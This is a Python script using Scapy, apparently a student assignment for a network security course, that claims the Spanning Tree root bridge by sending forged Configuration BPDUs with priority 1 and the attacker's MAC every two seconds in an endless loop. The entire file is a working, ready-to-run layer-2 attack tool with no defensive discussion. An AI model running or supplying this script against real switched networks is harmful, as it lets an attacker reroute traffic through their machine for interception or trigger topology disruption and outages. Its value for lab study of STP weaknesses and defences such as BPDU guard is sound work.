#!/usr/bin/env python3
# =============================================================
# Script   : STP Root Attack (Claim Root Bridge)
# Autor    : Yeury Lopez
# Matricula: 2025-0780
# Materia  : Seguridad de Redes
# =============================================================

from scapy.all import *
import time
import os
import sys

# -------------------------------------------------------------
# CONFIGURACIÓN DEL ATAQUE
# -------------------------------------------------------------
INTERFAZ        = "eth0"           # Interfaz de Kali hacia SW1
KALI_MAC        = get_if_hwaddr("eth0")  # MAC real de Kali

# Prioridad más baja posible para ganar la elección
# SW1 tiene 4096, nosotros anunciamos 1
BRIDGE_PRIORITY = 1

# Dirección multicast STP oficial
STP_MULTICAST   = "01:80:c2:00:00:00"

# -------------------------------------------------------------
# FUNCIÓN: Construir paquete BPDU falso
# -------------------------------------------------------------
def build_bpdu(bridge_priority, bridge_mac):

    # Ethernet hacia dirección multicast STP
    ethernet = Ether(
        src=bridge_mac,
        dst=STP_MULTICAST
    )

    # LLC requerido por STP
    llc = LLC(
        dsap=0x42,
        ssap=0x42,
        ctrl=0x03
    )

    # BPDU Configuration (tipo 0x00 = Configuration BPDU)
    bpdu = STP(
        proto=0x0000,           # Protocol ID
        version=0,              # STP version
        bpdutype=0x00,          # Configuration BPDU
        bpduflags=0x01,         # Topology Change flag
        rootid=bridge_priority, # Root Bridge Priority
        rootmac=bridge_mac,     # Root Bridge MAC (nosotros)
        pathcost=0,             # Path cost = 0 (mejor)
        bridgeid=bridge_priority, # Bridge Priority
        bridgemac=bridge_mac,   # Bridge MAC (nosotros)
        portid=0x8001,          # Port ID
        age=0,                  # Message Age
        maxage=20,              # Max Age
        hellotime=2,            # Hello Time
        fwddelay=15             # Forward Delay
    )

    return ethernet / llc / bpdu

# -------------------------------------------------------------
# FUNCIÓN PRINCIPAL: Ejecutar el ataque
# -------------------------------------------------------------
def stp_root_attack(interface, priority):

    print("=" * 55)
    print("   STP ROOT ATTACK")
    print("   Autor    : Yeury Lopez")
    print("   Matricula: 2025-0780")
    print("=" * 55)
    print(f"\n[*] Interfaz      : {interface}")
    print(f"[*] MAC de Kali   : {KALI_MAC}")
    print(f"[*] Priority falsa: {priority}")
    print(f"[*] Priority SW1  : 4096 (legítimo)")
    print(f"[*] Inicio        : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\n[!] Enviando BPDUs falsos...")
    print(f"[!] Presiona CTRL+C para detener")
    print("-" * 55)

    paquetes_enviados = 0

    try:
        while True:

            # Construir y enviar BPDU falso
            bpdu = build_bpdu(priority, KALI_MAC)
            sendp(bpdu, iface=interface, verbose=False)

            paquetes_enviados += 1

            if paquetes_enviados % 5 == 0:
                print(f"[+] BPDUs enviados : {paquetes_enviados} "
                      f"| Priority: {priority} "
                      f"| {time.strftime('%H:%M:%S')}")

            # STP Hello Time = 2 segundos
            time.sleep(2)

    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido")
        print(f"[✓] Total BPDUs enviados: {paquetes_enviados}")
        print("=" * 55)

# -------------------------------------------------------------
# PUNTO DE ENTRADA
# -------------------------------------------------------------
if __name__ == "__main__":

    if os.getuid() != 0:
        print("[!] ERROR: Ejecuta como root (sudo)")
        sys.exit(1)

    stp_root_attack(INTERFAZ, BRIDGE_PRIORITY)
